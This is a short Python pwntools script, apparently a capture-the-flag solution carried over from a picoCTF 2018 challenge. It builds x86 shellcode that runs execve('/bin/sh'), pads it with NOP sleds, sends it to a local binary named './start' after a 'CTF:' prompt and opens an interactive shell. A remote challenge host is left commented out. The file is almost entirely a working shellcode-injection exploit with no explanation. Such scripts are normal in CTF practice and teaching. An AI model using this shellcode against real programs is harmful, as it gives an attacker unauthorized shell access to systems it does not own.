#!/usr/bin/env python2

# originally taken from our picoctf2018/gps solution

from pwn import *

shellcode = '\x90' * 0x14 + '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + '\x90' * 0x14 

r = process('./start')
#r = remote('2018shell.picoctf.com', 29035)

r.recvuntil('CTF:')
r.sendline(shellcode)

r.interactive()
